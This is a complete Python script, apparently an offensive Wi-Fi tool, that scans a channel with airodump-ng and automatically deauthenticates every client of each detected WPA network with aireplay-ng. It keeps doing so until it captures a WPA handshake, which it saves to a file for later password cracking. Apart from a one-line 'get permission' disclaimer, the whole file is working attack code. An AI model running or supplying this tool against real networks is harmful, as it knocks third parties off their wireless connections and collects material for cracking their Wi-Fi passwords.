#!/usr/bin/env python3

'''
This script sends 802.11 deauth packets.
Don't be stupid - get permission and use responsibly.
I'm not your lawyer.
'''

import curses
import threading
import datetime as dt
from os import geteuid
from time import sleep
import subprocess as sp
from pathlib import Path
from sys import stderr, stdout
import xml.etree.ElementTree as xml
from tempfile import TemporaryDirectory
from argparse import ArgumentParser, ArgumentError


class WiFiNetwork():

    def __init__(self, netxml, interface):
        '''
        takes & parses "wireless-network" xml object
        '''

        self.interface      = interface
        self.bssid          = netxml.find('BSSID').text.upper()
        self.type           = netxml.attrib['type']
        self.ssid           = ''
        self.encryption     = ''

        try:
            if self.type != 'probe':
                ssid = netxml.find('SSID')
                encryption = ssid.findall('encryption')
                if any('WEP' in e.text for e in encryption):
                    self.encryption = 'WEP'
                elif any('WPA' in e.text for e in encryption):
                    self.encryption = 'WPA'
                else:
                    self.encryption = 'OPEN'
                essid = ssid.find('essid').text
                if essid:
                    self.ssid = essid
        except:
            pass

        try:
            self.man        = netxml.find('manuf').text
        except:
            self.man        = 'Unknown'

        if not self.ssid:
            if self.man:
                self.ssid = '<{}>'.format(self.man)
            else:
                self.ssid = '<unknown>'

        self.packets        = int(netxml.find('packets').find('total').text)
        
        self.last_seen      = dt.datetime.strptime(netxml.attrib['last-time'], "%a %b %d %X %Y")
        self.clients        = [WiFiClient(c) for c in netxml.findall('wireless-client')]

        self.handshake      = False
        

    def update(self, network):

        # only update SSID if 
        if 'unknown' not in network.ssid.lower():
            self.ssid       = network.ssid

        for client in network.clients:
            if client.mac not in [c.mac for c in self.clients]:
                self.clients.append(client)

        if network.last_seen > self.last_seen:
            self.last_seen = network.last_seen
            self.interface      = network.interface
            self.packets        = network.packets


    def deauth(self, dry_run=False, interval=10):
        '''
        yields series of ( client, (c_ack, a_ack) ) tuples
        '''

        #print('[+] Deauthing {}'.format(str(self)))
        #print('[*] Clients:\n\t{}'.format('\n\t'.join([str(c) for c in self.clients])))

        for client in self.clients:

            cmd = ['aireplay-ng', '-0', '1', '-a', self.bssid, '-c', client.mac, self.interface]

            c_acks, a_acks = 0,0

            self.process = sp.run(cmd, stdout=sp.PIPE, stderr=sp.DEVNULL)
            output = self.process.stdout.decode().split('[')[-1]

            if 'ACKs' in output:
                c_acks, a_acks = [int(n) for n in output.split('ACKs')[0].split('|')]

            yield (self.ssid, client, (c_acks, a_acks))

            sleep(interval)

        # send deauth to broadcast
        cmd = ['aireplay-ng', '-0', '1', '-a', self.bssid, self.interface]
        if not dry_run:
            self.process = sp.run(cmd, stdout=sp.DEVNULL, stderr=sp.DEVNULL)
        yield (self.ssid, WiFiClient('FF:FF:FF:FF:FF:FF'), (0, 0))
        sleep(interval)


    def __str__(self):

        return self.ssid


    def __repr__(self):

        return self.bssid





class WiFiClient():

    def __init__(self, client):
        '''
        takes & parses "wireless-client" xml object
        '''

        self.man    = 'Unknown'

        if type(client) == str:
            self.mac    = client.upper()

        else:
            self.mac    = client.find('client-mac').text.upper()
            try:
                self.man    = client.find('client-manuf').text
            except:
                pass


    def __repr__(self):

        return self.mac


    def __str__(self):

        return '{} [{}]'.format(self.man[:10], self.mac[12:])




class Overseer():

    def __init__(self, channel, interfaces, write, blacklist=[], whitelist=[], interval=10, dry_run=False, debug=False):

        self.channel            = int(channel)
        self.interfaces         = interfaces
        self.write              = write
        self.blacklist          = [str(e).upper() for e in blacklist]
        self.whitelist          = [str(e).upper() for e in whitelist]
        self.interval           = interval
        self.dry_run            = dry_run
        self.debug              = debug

        self.networks           = {}
        self.nlock              = threading.Lock()
        self.networks_sorted    = []

        self.deauths            = []
        self.dlock              = threading.Lock()

        self.handshakes         = []

        self.monitor            = threading.Thread(target=self.run)
        self.main_loop          = threading.Thread(target=self._main_loop)
        self.check_handshakes   = threading.Thread(target=self._update_handshakes)
        
        self.refresh            = 1
        self.max_time           = 10
        
        self.temp_dir           = TemporaryDirectory()

        self.terminate          = False
        self.errormsg           = ''


    def start(self):

        print('[+] Using interface(s): {}'.format(', '.join(self.interfaces)))
        print('[+] Starting airodump-ng thread(s)')
        self.monitor.start()
        print('[+] Starting deauth threads')
        self.main_loop.start()
        self.check_handshakes.start()

        if self.debug:
            while not self.terminate:
                if self.networks:
                    print('WiFi Networks:')
                    print('\n'.join(str(n) for n in self.get_network()))
                    print('\nDeauths: {}'.format(len(self.deauths)))
                    print('\nHandshakes ({}):'.format(len(self.handshakes)))
                    print('\n'.join(self.handshakes))
                    print('')
                    sleep(self.refresh)

        else:
            try:
                console = curses.initscr()
                curses.noecho()
                curses.cbreak()

                while not self.terminate:

                    with self.dlock:
                        self.deauths = self.deauths[-1000:]

                    #if self.networks:

                    networks = self.get_network()

                    console.clear()

                    middle = {
                        'y': int(curses.LINES / 2),
                        'x': int(curses.COLS / 2)
                    }

                    max_lines = middle['y'] - 4

                    win_top0    = curses.newwin(curses.LINES, curses.COLS, 0, 0)
                    win_bot0    = curses.newwin(middle['y'], middle['x'], middle['y'], 0)
                    win_bot1    = curses.newwin(middle['y'], middle['x'], middle['y'], middle['x'])

                    long_line   = ('-' * (curses.COLS - 1)) + '\n'
                    short_line  = ('-' * (middle['x'] - 1)) + '\n'

                    win_top0.addstr('WiFi Networks:\n' + long_line)
                    win_bot0.addstr('\nHandshakes: ({})\n'.format(len(self.handshakes)) + short_line)
                    win_bot1.addstr('\nDeauths: ({})\n'.format(len(self.deauths)) + short_line)
                    
                    win_top0.addstr('\n'.join([str(s) for s in networks[:max_lines]]))
                    win_bot0.addstr('\n'.join(self.handshakes[:max_lines]))
                    with self.dlock:
                        win_bot1.addstr('\n'.join(['{} <-> {} ({}|{})'.format(d[0][:10], d[1], d[2][0], d[2][1]) for d in self.deauths[-max_lines:]]))
                    
                    win_top0.refresh()
                    win_bot0.refresh()
                    win_bot1.refresh()

                    sleep(self.refresh)

            except Exception as e:
                print('[-] Error in display function: ' + str(e))
                exit(2)
            finally:
                curses.echo()
                curses.nocbreak()
                curses.endwin()



    def stop(self):

        self.terminate = True
        self.main_loop.join()
        self.monitor.join()

        stderr.write(self.errormsg)
        stderr.flush()


    def run(self):

        for i in range(len(self.interfaces)):

            cmd = ['airodump-ng', '--write-interval', '1', '--update', '999999', '-c', str(self.channel), '-w', self.temp_dir.name + '/data{}'.format(i), self.interfaces[i]]

            t = threading.Thread(target=self.airodump, args=(cmd, i))
            t.start()

        while not self.terminate:

            sleep(1)
            try:
                sp.run(['pgrep', 'airodump-ng'], check=True, stdout=sp.DEVNULL, stderr=sp.DEVNULL)
            except sp.CalledProcessError:
                self.terminate = True
                break

        sp.run(['killall', '-s', 'SIGTERM', 'airodump-ng'], stderr=sp.DEVNULL)

        for i in range(len(self.interfaces)):

            if list(self._get_handshakes(i)):
                cmd = ['mv', self.temp_dir.name + '/data{}-01.cap'.format(i), '{}-{}.cap'.format(self.write, i)]
                sp.run(cmd, stdout=sp.DEVNULL, stderr=sp.DEVNULL)
        
        self.temp_dir.cleanup()



    def get_network(self, bssid=None):

        with self.nlock:
            if not bssid:
                _sorted = list(self.networks.values())
                _sorted.sort(key=lambda x: x.last_seen)
                if _sorted:
                    return _sorted
                else:
                    return []
            else:
                try:
                    return self.networks[bssid.upper()]
                except KeyError:
                    return None


    def put_network(self, network):

        if not self.is_blacklisted(network) and self.is_whitelisted(network) and network.type != 'probe':
            with self.nlock:
                if network.bssid in self.networks:
                    self.networks[network.bssid].update(network)
                else:
                    self.networks[network.bssid] = network


    def is_whitelisted(self, network):

        if self.whitelist:
            return (network.ssid.upper() in self.whitelist) or (network.bssid in self.whitelist)
        else:
            return True


    def is_blacklisted(self, network):

        return (network.ssid.upper() in self.blacklist) or (network.bssid in self.blacklist)


    def airodump(self, cmd, number):

        try:

            sp.run(cmd, check=True, stdout=sp.PIPE, stderr=sp.PIPE)

        except sp.CalledProcessError as e:
            self.errormsg = '[!] Error in airodump process:\n\t{}\n'.format(e.stderr.decode())
            self.terminate = True


    def deauth_network(self, network):

        # Keeps going as long as the network has been seen recently, and there isn't a handshake yet.
        while not network.handshake and (dt.datetime.now() - network.last_seen).total_seconds() < self.max_time:
            for result in network.deauth(dry_run=self.dry_run, interval=self.interval):
                with self.dlock:
                    self.deauths.append(result)


    def _main_loop(self):

        sleep(1)

        deauth_threads  = {}

        while not self.terminate:

            for i in range(len(self.interfaces)):

                for n in self._read_xml(self.temp_dir.name + '/data{}-01.kismet.netxml'.format(i), self.interfaces[i]):
                    self.put_network( n )

                for network in self.get_network():
                    if not network.handshake and not network.bssid in deauth_threads and network.encryption == 'WPA':
                        t = threading.Thread(target=self.deauth_network, args=(network,), daemon=True)
                        t.start()
                        deauth_threads[network.bssid] = t

                for thread in [t for t in deauth_threads.keys()]:
                    if not deauth_threads[thread].is_alive():
                        deauth_threads.pop(thread, 0)

                sleep(1)



    def _read_xml(self, f, interface):
        '''
        takes filename of *.kismet.netxml
        yields list of "WiFiNetwork" objects
        '''

        if not Path(f).exists():
            if self.debug:
                stderr.write("[!] Path \"{}\" does not appear to exist\n".format(str(f)))
            return []

        else:
            try:
                tree = xml.parse(str(f))
                root = tree.getroot()

                for netxml in root.findall('wireless-network'):
                    yield WiFiNetwork(netxml, interface)

            except xml.ParseError:
                pass


    def _update_handshakes(self):

        while not self.terminate:
            for i in range(len(self.interfaces)):
                for ssid, mac in self._get_handshakes(i):
                    if not ssid in self.handshakes:
                        self.handshakes.append(ssid)
                        self.get_network(mac).handshake = True
            sleep(5)


    def _get_handshakes(self, number):

        cmd = ['wpaclean', self.temp_dir.name + '/wpaclean', self.temp_dir.name + '/data{}-01.cap'.format(number)]

        process = sp.run(cmd, stdout=sp.PIPE, stderr=sp.DEVNULL)
        for line in process.stdout.decode().split('\n'):
            if line.startswith('Net'):
                line = line.split(' ')
                try:
                    ssid = ' '.join(line[2:])
                    mac = line[1]
                    yield (ssid, mac)
                except IndexError:
                    continue



### MISC FUNCTIONS ###

def get_interfaces():

    wlan_interfaces = []

    cmd = ['ip', '-o', 'link']
    cmd_output = sp.run(cmd, stdout=sp.PIPE).stdout.decode().split('\n')

    for line in cmd_output:

        # if the interface is wireless
        if ': wlp' in line or ': wlan' in line:

            ifc_name = line.split()[1].split(':')[0]

            try:
                # if interface has an IP address
                if sp.run(['ip', '-o', 'addr', 'show', 'dev', ifc_name], stdout=sp.PIPE, check=True).stdout.decode():
                    # places it at the end of the list
                    wlan_interfaces.append(ifc_name)
                else:
                    # otherwise, place it at the beginning
                    wlan_interfaces.insert(0, ifc_name)

            except sp.CalledProcessError:
                continue

    return wlan_interfaces



if __name__ == '__main__':

    ### ARGUMENTS ###

    parser = ArgumentParser(description="PEW PEW")

    parser.add_argument('-c', '--channel',      required=True,                  help="channel on which to listen")
    parser.add_argument('-i', '--interface',                                    help="wireless interface(s) to use (comma-separated)")
    parser.add_argument('-n', '--interval',     default=10,  type=float,        help="deauth interval per AP in seconds (default: 10)")
    parser.add_argument('-s', '--save',         default='./handshakes',     help="file in which to save handshakes")
    parser.add_argument('-b', '--blacklist',    default='',                     help="blacklist these ESSIDs or BSSIDs (comma-separated)")
    parser.add_argument('-w', '--whitelist',    default='',                     help="whitelist these ESSIDs or BSSIDs (comma-separated)")
    parser.add_argument('-r', '--dry-run',      action='store_true',            help="don't sent any packets")
    parser.add_argument('-a', '--all',          action='store_true',            help="listen on all available interfaces")
    parser.add_argument('--debug',              action='store_true',            help="don't use Curses (print directly to STDOUT)")

    try:

        options = parser.parse_args()
        assert geteuid() == 0, "Please sudo me"

        if not options.interface:
            if options.all:
                options.interface = get_interfaces()
            else:
                options.interface = [get_interfaces()[0]]
        else:
            options.interface = options.interface.split(',')

        if options.blacklist:
            options.blacklist = options.blacklist.split(',')
        if options.whitelist:
            options.whitelist = options.whitelist.split(',')

        o = Overseer(options.channel, options.interface, options.save, options.blacklist, options.whitelist, options.interval, options.dry_run, options.debug)
        o.start()
        o.stop()


    except ArgumentError:
        stderr.write("\n[!] Check your syntax. Use -h for help.\n")
        exit(2)
    except AssertionError as e:
        stderr.write("[!] {}\n".format(str(e)))
        exit(2)
    except KeyboardInterrupt:
        stderr.write("[*] Cleaning up...")
        o.stop()
        stderr.write("\n[!] Program stopping.\n")
        exit(1)